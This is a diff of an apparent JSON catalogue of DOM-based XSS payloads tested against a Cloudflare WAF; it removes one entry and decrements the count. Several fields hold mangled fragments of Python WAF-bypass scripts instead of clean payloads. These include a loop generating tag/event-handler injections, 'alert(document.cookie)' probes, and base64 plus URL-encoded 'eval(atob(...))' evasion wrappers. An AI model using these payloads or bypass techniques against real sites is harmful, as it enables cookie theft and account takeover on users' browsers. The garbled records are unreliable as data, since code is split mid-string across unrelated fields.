@@ -1,7 +1,7 @@
 {
   "category": "xss",
   "subcategory": "dom_based",
-  "count": 24,
+  "count": 23,
   "payloads": [
     {
       "id": "xss-0010",
@@ -249,20 +249,6 @@
       "description": "alert(document', 'confirm(1)', 'prompt(1)', 'print()',\n    'onerror=alert', 'onload=alert', '<script>alert', '<svg/onload',\n    'javascript:alert', 'document.cookie', 'document.domain',\n]\n\ndef raw_req(req_bytes, label=\"",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0428",
-      "category": "xss",
-      "subcategory": "dom_based",
-      "payload": "alert(1)\")()',\n]\n\ncount_a = 0\nfor tag in TAGS_EXT:\n    for ev in EVENTS_EXT[:3]:\n        for func in FUNCS_EXT[:2]:\n            attr = ''\n            if tag == 'img': attr = 'src=x '\n            elif tag == 'video': attr = 'src=x '\n            elif tag == 'audio': attr = 'src=x '\n            elif tag == 'input': attr = 'autofocus '\n            elif tag == 'details': attr = 'open '\n            elif tag == 'select': attr = 'autofocus '\n            elif tag == 'textarea': attr = 'autofocus '\n            elif tag == 'button': attr = 'autofocus '\n            elif tag == 'xss': attr = 'tabindex=1 autofocus '\n            p = f'<{tag} {attr}{ev}={func}>'\n            get(p)\n            count_a += 1\n\nprint(f\"  Extended matrix done: {count_a}, {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- B: Base64 + Multi-Layer URL Encoding ---\")\n\nB64_SOURCES = [\n    '<script>alert(1)</script>",
-      "description": "<img src=x onerror=alert(1)>',\n    '<svg onload=alert(1)>',\n    'alert(document.cookie)',\n    'confirm(document.domain)',\n]\n\ncount_b = 0\nfor src in B64_SOURCES:\n    b64 = base64.b64encode(src.encode()).decode()\n    \n    # Base64 → single URL encode\n    get(urllib.parse.quote(f'eval(atob(\"{b64}",
-      "technique": "encoding",
-      "source_file": "waf_round80_final.py",
       "tested_against": [
         "cloudflare_waf"
       ],
